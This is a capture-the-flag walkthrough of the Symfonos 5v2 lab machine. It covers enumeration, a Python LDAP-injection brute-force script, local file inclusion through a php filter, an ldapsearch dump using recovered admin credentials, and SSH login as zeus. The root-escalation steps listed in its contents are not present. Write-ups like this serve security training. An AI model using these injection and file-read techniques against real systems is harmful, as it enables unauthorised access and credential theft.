SYMFONOS 5V2

## Methodology and summary
## Table of Contents
1. [Information Gathering]()
	1.1 [Discovery host]()
	1.2 [Service Enum]()
	1.3 [Web]()
		1.3,1 [Gobuster enum web content]()
		1.3.2 [Downloading and reading .log files]()

2. [Exploitation]()
	2.1 [Bypass login sqli]()
	2.2 [LFI (local file inclusion)  - using bash to generate payloads]()
		2.2.1 [Reverse shell]()

3. [Post exploitation]()
	3.1 [Remote forwarding with ssh]()
	3.2 [Web 8080]()
		3.2.1 [Gobuster enum web content]()
		3.2.2 [Python Pickle without exploit to get root]()
		3.2.3 [Python Pickle with coding exploit to get root]()

# 1 Information gathering
## 1.1 Discovery host
`nmap -Pn -F 192.168.196.1/24 -oN host_discovery.txt`
![5c85eeec9fcbcf370e825d573ebbcd96.png](./_resources/deafa02fa26b4a93b959080a6e9e7c3c.png)


## 1.2 Service enum
`nmap -sV -sC -p- 192.168.196.128 -oN full_service_enum-sC.txt`
![fac1583f3d1c8e3279936256b3cdb1d6.png](./_resources/34b390e29a164a6d9f89e36b85e7c5fd.png)

## 1.3 Web
![1d07ec80db792f70f1ca01ce5c71cb39.png](./_resources/bff54c526e9f415da0473817d0ed14df.png)

### 1.3.1 Wappalyzer
![e417e2de566f14691ed766389420ca6b.png](./_resources/5ce1e98fbe8043fa835ecfcdcc6ef712.png)

## 1.3.2 Dirb enum web content
`dirb http://192.168.196.128`
![4d40c830929a49cedc6d5dd162fb7ae1.png](./_resources/0a0b1081cd534842beacb5c5693314ea.png)


# 2 Exploitation 
Since we have a login page with php (80) and ldap port (389), becomes deductible that the login is based on ldap authentication.

## 2.1 Ldap injection - burpsuit intruder 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md
![b549598719eae6ffb3f1b5563a768d5c.png](./_resources/63b6957412504f2691fe4123f66fb415.png)
At one point it returns responses of different length.

## 2.1 Ldap injection - automation python script
```
# Script para ldap injection - byth22
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

import requests
import re

def brute(target, headers):
    f = open("ldapi-payloads.txt", "r")
    for i in f:
        params = (
            ('username', i),
            ('password', 'teste'),
        )
            
        response = requests.get('http://'+target+'/admin.php', headers=headers, params=params, verify=False)

        try:
            re.findall(r'Invalid', response.content)[0]

        except IndexError:
            print ("Payload encontrada: %s" %i)


def main():
    target = '192.168.196.130'

    headers = {
        'Host': target,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Referer': 'http://192.168.196.130/admin.php',
        'Upgrade-Insecure-Requests': '1',
    }
    brute(target, headers)


main()
````

## 2.2 Local file inclusion after login
![ee4356d8b67bedd8fbe989f961e86a1a.png](./_resources/5ae134b2455e48ef937780e99b675901.png)
A normal payload (/etc/passwd) works, and there was an attempt to read admin.php for analyse its code, but it is rendered. We dont need an rendered page, we need read it. For it was used php filter:
![ebc7c3f32e61d368c35bed337b2f09b0.png](./_resources/ac7266981ca346009b6e1f99f807e39c.png)
Ant it works.

Now we can decode and read it:
![3464297aaa1f79da24548da3b2040de7.png](./_resources/2a0c9a6803084a9f90290106b50f93a2.png)

Let’s use these credentials to dump all the information using ldap.
```
ldapsearch -x -LLL -h 192.168.196.128 -D 'cn=admin,dc=symfonos,dc=local' -w qMDdyZh3cT6eeAWD -b 'dc=symfonos,dc=local'
```
![6acd37b2c09c51c28a9df47a04433b43.png](./_resources/0ad781d9c6d3402a998e79935d88a86c.png)

## 2.2.1 SSH using zeus account
zeus:cetkKf4wCuHC9FET
![bd224c6770df272f225fe539ea0ca4ca.png](./_resources/5dc5e9268fd14d818a4f9a0a1029579b.png)


# 3 Post-exploitation
https://gtfobins.github.io/gtfobins/dpkg/

LinEnum.sh returned some good informations:
![a8930b15a4e6fea2c76677d100e8a15d.png](./_resources/e2c3119d4ddc4a09861c59075575c8ac.png)
![ca2b481efa73145d38df2a60fd66df71.png](./_resources/e078831174654845bf64330c71c2d07d.png)